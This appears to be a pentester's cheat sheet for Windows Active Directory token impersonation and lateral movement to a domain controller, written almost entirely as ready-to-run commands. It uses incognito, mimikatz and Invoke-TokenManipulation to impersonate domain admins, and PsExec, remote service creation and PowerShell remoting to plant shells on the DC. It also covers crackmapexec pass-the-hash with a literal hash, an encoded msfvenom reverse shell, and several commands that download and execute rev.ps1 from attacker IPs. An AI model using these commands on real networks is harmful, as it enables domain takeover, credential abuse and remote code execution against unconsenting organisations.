---
description: need elevated admin
---

# Impersonating token & pivot

{% embed url="https://juggernaut-sec.com/lateral-movement-token-impersonation/" %}

### incognito impersonate

```
.\incognito.exe list_tokens -u (find domain\admin delegation token)
.\incognito.exe execute -c "domain\admin" .\shell.exe

>> with domain admin shell, pivot to DC
```

{% embed url="https://labs.withsecure.com/publications/incognito-v2-0-released" %}

### mimikatz impersonate

```
.\mimikatz.exe " " " " "exit"
privilege::debug
token::list (to find any domain admin)
token::elevate /domainadmin (seek and impersonate any domain admin that it can find)
token::run /process:"C:\temp\shell.exe"

>> with domain admin shell, pivot to DC
```

### pivoting

{% hint style="info" %}
[Create domain admin account](../../general/privesc/windows/#create-user-for-persistency-as-admin-system) as a DC admin / admin on DC ser so that no need the actual DC admin creds for persistence,&#x20;

or change password `net user adminuser pass123! /domain`
{% endhint %}

#### smb (with dc user/admin creds)

{% code overflow="wrap" %}
```
dir \\DC01\c$ (to check if have access to dc)

PSexec.exe \\DC01 (-s) -c C:\temp\rev.exe -d -accepteula

```
{% endcode %}

#### sc pivot (smb) - DC admin

create service on the remote ser and start

query, stop, start, delete, and add system services

{% code overflow="wrap" %}
```
copy C:\temp\shell.exe \\DC01\C$\Windows\temp

sc \\DC01 create pivot binpath= "C:\Windows\temp\shell.exe"
sc \\DC01 start pivot
```
{% endcode %}

#### powershell - DC admin

```powershell
$dcs = NEW-PSSession -Computer SANDBOXDC
Invoke-Command -Session $dcs -ScriptBlock {ipconfig}
(validate we can exec cmd to DC remotely)

Copy-Item "C:\Users\Public\shell.exe" -Destination "C:\Users\Public\" -ToSession $dcs

*setup listener

$dcs = NEW-PSSession -Computer SANDBOXDC
Invoke-Command -Session $dcs -ScriptBlock {C:\Users\Public\shell.exe}
```

alt

{% code overflow="wrap" %}
```powershell
(normal to hang)
Invoke-Command -ComputerName dc.domain.local -ScriptBlock {hostname}
Invoke-Command -ComputerName dc.domain.local -ScriptBlock {iex(new-object net.webclient).downloadstring('http://172.16.1.30/rev.ps1')}

or download shell.exe and then exec
```
{% endcode %}

#### CME with local admin hash (from HKLM SAM SYS :LMHASH) to impersonate domain admin for accessing dc with rev.ps1

{% code overflow="wrap" %}
```
(-p pwd; look for TOKEN=# domainadmin token)
crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=list
```
{% endcode %}

{% code overflow="wrap" %}
```
(-p pwd; token# look for domainadmin)
crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC="powershell.exe -c Invoke-Command -ComputerName Juggernaut-DC.juggernaut.local -ScriptBlock {hostname}"

crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC="powershell.exe -c Invoke-Command -ComputerName Juggernaut-DC.juggernaut.local -ScriptBlock {iex(new-object net.webclient).downloadstring('http://172.16.1.30/rev.ps1')}"

(normal to hang)
```
{% endcode %}

DC Admin impersonation (not yet pivot)

{% code overflow="wrap" %}
```

crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC=whoami

crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC="powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30/rev.ps1')"
```
{% endcode %}

alt

{% code overflow="wrap" %}
```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.173 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw -o shell.bin

crackmapexec smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M shellcode_inject -o PATH=/path/to/shell.bin

-H nthash
-d domain.local / .
```
{% endcode %}

#### Invoke-TokenManipulation.ps1 (not yet pivot)

{% code overflow="wrap" %}
```powershell
. .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/rev.ps1');\"};"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell

Invoke-TokenManipulation -CreateProcess "C:\shell.exe" -Username "nt authority\system"

Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/rev.ps1');\";" -Username "nt authority\system"

or download shell.exe and then exec
```
{% endcode %}

###
